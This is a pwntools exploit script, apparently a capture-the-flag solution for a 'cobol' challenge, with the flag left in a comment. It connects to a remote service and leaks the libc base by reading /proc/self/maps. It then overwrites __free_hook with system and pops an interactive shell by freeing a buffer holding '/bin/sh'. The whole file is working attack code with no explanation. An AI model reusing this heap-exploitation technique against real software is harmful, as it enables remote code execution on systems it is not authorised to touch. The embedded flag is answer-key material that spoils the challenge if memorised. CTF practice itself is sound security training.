from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']
#context.log_level='debug'
libc=ELF('./libc-2.27.so')
#io=process('./chall')
io = remote('cobol.pwni.ng',3083)

def c(name,idx,size):
    io.recvuntil('>')
    io.sendline('1')
    io.recvuntil('Name:')
    io.sendline(name)
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Size:')
    io.sendline(str(size))    

def o(name,idx,size):
    io.recvuntil('>')
    io.sendline('2')
    io.recvuntil('Name:')
    io.sendline(name)
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Size:')
    io.sendline(str(size)) 

def r(idx):
    io.recvuntil('>')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(idx))

def w(idx,data):
    io.recvuntil('>')
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(idx))
    io.recvuntil('Input:')
    io.send(data)
    io.recvuntil(')')
    io.sendline('n')

def copy(name1,name2):
    io.recvuntil('>')
    io.sendline('6')
    io.recvuntil('filename1:')
    io.sendline(name1)
    io.recvuntil('filename2:')
    io.sendline(name2)

def clos(idx):
    io.recvuntil('>')
    io.sendline('5')
    io.recvuntil('Index:')
    io.sendline(str(idx))

copy('/proc/self/maps','a')
o('a',1,0x100)
r(1)
io.recvuntil('libm-2.27.so\n')
[io.recvline() for i in range(3)]
libc_base=int(io.recv(12),16)
print(hex(libc_base))
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
w(1,'/bin/sh\x00')
c('a'*0x50,2,0x100)
w(2,p64(free_hook))
copy('a'*0x50,'b')
c('c',3,0x50)
o('c',4,0x50)
w(4,p64(sys))
#gdb.attach(io)
clos(1)
io.interactive()

#PCTF{l3arning_n3w_languag3_sh0uld_start_with_g00d_bugs_99d4ec917d097f63107e}




